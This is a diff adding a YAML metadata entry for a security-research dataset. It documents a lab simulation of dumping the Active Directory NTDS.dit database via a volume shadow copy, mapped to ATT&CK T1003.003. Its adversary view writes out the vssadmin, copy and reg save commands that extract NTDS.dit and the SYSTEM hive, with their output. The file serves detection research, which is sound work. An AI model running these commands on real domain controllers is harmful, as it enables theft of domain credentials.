@@ -1,0 +1,58 @@
+title: Dumping NTDS.dit from Volume Shadow Copy
+id: SDWIN-230718150800
+contributors:
+- Jose Rodriguez @Cyb3rPandaH
+creation_date: 2023/07/18
+modification_date: 2023/07/18
+platform:
+- Windows
+type: atomic
+tags:
+- ntds
+- vssadmin
+- volume shadow copy
+description: After creating a C volume shadow copy, Active Directory database NTDS.dit is dumped by copying it from the shadow copy. Dataset generated using atomic tests 1 and 2 for T1003.003. See references to Atomic Read Team project. 
+attack_mappings:
+  - technique: T1003
+    sub-technique: "003"
+    tactics:
+      - TA0006
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/cmd_copy_ntds_from_volume_shadow_copy.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: cmd
+      module: cmd
+      script: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    Microsoft Windows [Version 10.0.20348.1607]
+    (c) Microsoft Corporation. All rights reserved.
+
+    C:\Users\Administrator>vssadmin.exe create shadow /for=C:
+    vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+    (C) Copyright 2001-2013 Microsoft Corp.
+
+    Successfully created shadow copy for 'C:\'
+        Shadow Copy ID: {6cc3699a-968b-4e45-b949-00b3426b86ed}
+        Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+
+    C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
+            1 file(s) copied.
+
+    C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE
+            1 file(s) copied.
+
+    C:\Users\Administrator>reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
+    The operation completed successfully.
+
+
+    C:\Users\Administrator>
+references:
+- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md#atomic-test-1---create-volume-shadow-copy-with-vssadmin
+- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md#atomic-test-2---copy-ntdsdit-from-volume-shadow-copy
